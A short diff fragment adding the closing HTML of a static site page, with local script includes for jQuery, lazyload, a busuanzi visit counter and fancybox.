+</article>
+
+
+
+</section>
+    </div>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/technology.js"></script>
+
+  </div>
+</body>
+</html>
